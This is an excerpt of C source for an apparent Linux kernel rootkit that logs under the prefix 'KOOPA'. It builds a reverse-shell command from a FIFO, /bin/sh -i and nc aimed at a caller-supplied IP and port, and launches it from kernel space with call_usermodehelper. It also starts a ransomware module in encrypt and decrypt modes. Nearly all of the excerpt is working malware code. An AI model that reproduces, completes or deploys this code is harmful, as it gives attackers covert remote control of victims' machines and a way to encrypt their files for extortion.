...
#define EXEC_P1 "/bin/rm /tmp/koopa/fifo;/usr/bin/mkfifo /tmp/koopa/fifo;/bin/cat /tmp/koopa/fifo|/bin/sh -i 2>&1|/bin/nc "
#define EXEC_P2 " >/tmp/koopa/fifo"
...
void execute_reverse_shell(struct work_struct *work){
    ...
    strcat(exec, EXEC_P2);
    printk(KERN_INFO "KOOPA:: Starting reverse shell %s\n", exec);
    
    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if(err<0){
        printk(KERN_INFO "KOOPA:: Error executing usermodehelper.\n");
    }
    kfree(exec);
...
void execute_module (struct work_struct *work) {
    ...
    switch(params->module){
        case RANSOM_ENCRYPT: ;
            ...
            strcat(exec, " -m E");
            printk(KERN_INFO "KOOPA:: Calling ransom module ENCRYPT MODE %s\n", argv[2]);
        ...
        case RANSOM_DECRYPT: ;
            ...
            strcat(exec, params->args);
            strcat(exec, " -m D");
            printk(KERN_INFO "KOOPA:: Calling ransom module DECRYPT MODE %s \n", argv[2]);
            err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
            if(err<0){
                printk(KERN_INFO "KOOPA:: Error executing usermodehelper.\n");
            }
...
int start_ransom_module(umbra_module module, char* args){
    ...
    if(!params){
        printk(KERN_INFO "KOOPA:: Error allocating memory\n");
        return 1;
    }
    ...
    if(err<0){
        printk(KERN_INFO "KOOPA:: Error scheduling work of starting ransom module\n");
    }
    return err;
}
...
int start_reverse_shell(char* ip, char* port){
    ...
    err = schedule_work(&params->work);
    if(err<0){
        printk(KERN_INFO "KOOPA:: Error scheduling work of starting shell\n");
    }
    return err;
